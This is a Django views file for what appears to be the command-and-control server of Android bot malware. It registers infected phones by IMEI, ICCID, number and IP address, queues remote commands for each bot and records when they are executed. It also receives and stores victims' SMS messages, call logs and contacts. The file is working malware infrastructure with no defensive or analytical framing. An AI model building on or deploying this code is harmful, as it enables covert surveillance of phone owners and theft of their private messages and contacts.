# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.shortcuts import render
from django.http import HttpResponse, JsonResponse

import logging
import json
import models
import datetime
import dateutil.parser


logger = logging.getLogger(__name__)


def index(request):
    return HttpResponse("index")


def stbi(request):
    """
    Device/bot registration
    """
    if request.method != "POST":
        return HttpResponse("stbi")
    else:
        data = json.loads(request.body.decode('base64'))
        print("device registration: %s" % data)
        bot = None
        try:
            bot = models.Bot.objects.get(hash=data['hash'])
        except models.Bot.DoesNotExist:
            bot = models.Bot()
            bot.hash = data['hash']
            bot.imei = data.get('imei', '')
            bot.iccid = data.get('iccid', '')
            bot.number = data.get('number', '')
            bot.model = data.get('model', '')
            bot.os = data.get('os', '')
            bot.control_number = data.get('control_number', '')
            bot.ipaddr = request.META['REMOTE_ADDR']
            bot.save()

        return HttpResponse(bot.id)


def sban(request):
    if request.method != "POST":
        return HttpResponse("sban")
    else:
        data = json.loads(request.body.decode('base64'))
        print("GetTemplates (sban): %s" % data)
        return JsonResponse({})


def sy(request):
    if request.method != "POST":
        return HttpResponse("sy")
    else:
        data = json.loads(request.body.decode('base64'))
        print("GetCommands (sy): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        bot.last_online = datetime.datetime.utcnow()
        bot.ipaddr = request.META['REMOTE_ADDR']
        bot.save()

        commands = []
        for command in models.BotCommand.objects.filter(bot=bot, executed=False):
            commands.append({"command_name": command.command,
                             "command_data": command.parameters,
                             "command_sig": command.id})
            command.deployed = datetime.datetime.utcnow()
            command.save()

        return JsonResponse({"commands": commands})


def ssl(request):
    if request.method != "POST":
        return HttpResponse("ssl")
    else:
        data = json.loads(request.body.decode('base64'))
        print("SendSmsList (ssl): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        for msg in data['sms_list']:
            # TODO(LM): is there a way of bulk inserting?
            sms = models.SmsData()
            sms.bot = bot
            sms.date = msg['date']
            sms.type = msg['type']
            sms.address = msg['address']
            sms.message = msg['message']
            sms.save()
        return HttpResponse("OK")


def scal(request):
    if request.method != "POST":
        return HttpResponse("scal")
    else:
        data = json.loads(request.body.decode('base64'))
        print("SendCallList (scal): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        for msg in data['call_list']:
            # TODO(LM): is there a way of bulk inserting?
            call = models.CallLog()
            call.bot = bot
            call.date = dateutil.parser.parse(msg['date'])
            call.duration = msg['duration']
            call.type = msg['type']
            call.type_str = msg['typeStr']
            call.number = msg['number']
            call.save()
        return HttpResponse("OK")


def scol(request):
    if request.method != "POST":
        return HttpResponse("scol")
    else:
        data = json.loads(request.body.decode('base64'))
        print("SendContactList (scol): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        for msg in data['contact_list']:
            # TODO(LM): is there a way of bulk inserting?
            contact = models.Contact()
            contact.bot = bot
            contact.display_name = msg['display_name']
            contact.data = msg['data']
            contact.save()
        return HttpResponse("OK")


def ucs(request):
    """
     Executed command
    """
    if request.method != "POST":
        return HttpResponse("ucs")
    else:
        data = json.loads(request.body.decode('base64'))
        print("ExecutedCommand (ucs): %s", data)
        cmd = models.BotCommand.objects.get(id=data['command_sig'])
        cmd.executed = True
        cmd.save()
        return HttpResponse("OK")
